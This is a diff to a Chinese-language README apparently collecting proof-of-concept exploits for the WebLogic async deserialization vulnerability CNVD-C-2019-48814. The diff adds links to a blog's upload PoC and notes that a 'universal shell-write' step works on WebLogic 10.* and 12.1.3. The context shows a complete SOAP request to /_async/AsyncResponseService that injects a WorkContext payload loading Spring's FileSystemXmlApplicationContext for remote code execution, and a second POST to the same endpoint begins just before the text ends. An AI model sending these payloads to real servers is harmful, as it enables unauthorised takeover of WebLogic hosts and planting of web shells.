@@ -1,6 +1,13 @@
 # CNVD-C-2019-48814和CNNVD-201904-961</br>
 感谢t00ls-ximcx0101提供脚本</br>
 CNVD-C-2019-48814 POC Summary</br>
+目前清水大佬简书已经更新反序列化上传POC。</br>
+相关链接如下:</br>
+清水大佬的博客:</br>
+https://www.jianshu.com/p/c4982a845f55</br>
+安全祖师爷转发:
+https://dwz.cn/2GQvbUae</br>
+
 影响范围:WebLogic 10.*、12.1.3</br>
 在Weblogic 10.*测试通过：</br>
 1.Linux
@@ -451,7 +458,7 @@ content-type: text/xml
 
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>xx</string></void></class></java>    </work:WorkContext>   </soapenv:Header>   <soapenv:Body>      <asy:onAsyncDelivery/>   </soapenv:Body></soapenv:Envelope>
 ```
-4、通用写入shell</br>
+4、通用写入shell，在Weblogic 10.*和12.1.3测试通过</br>
 测试POC:</br>
 ```
 POST /_async/AsyncResponseService HTTP/1.1
